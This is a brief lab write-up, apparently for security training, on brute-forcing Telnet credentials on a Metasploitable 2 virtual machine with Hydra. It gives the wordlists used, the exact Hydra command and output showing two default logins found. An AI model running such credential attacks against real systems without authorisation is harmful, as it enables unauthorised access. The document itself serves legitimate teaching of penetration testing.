# Lab 4: Credential Brute-Force via Telnet

**Target:** Metasploitable 2 VM
**IP Address:** 192.168.10.100
**Service:** Telnet (Port 23)
**Tool:** Hydra

---

## 1. Attack Preparation (Wordlists)

**Username List (`usernames.txt`):** Derived from the Samba user enumeration (including msfadmin, user, root, postgres, etc.).
**Password List (`passwords.txt`):** A small list of common default passwords (msfadmin, password, toor, etc.).

---

## 2. Execution (Hydra)

**Command:**
```bash
hydra -L usernames.txt -P passwords.txt telnet://192.168.10.100

[23][telnet] host: 192.168.10.100   login: user   password: user
[23][telnet] host: 192.168.10.100   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 2 valid passwords found
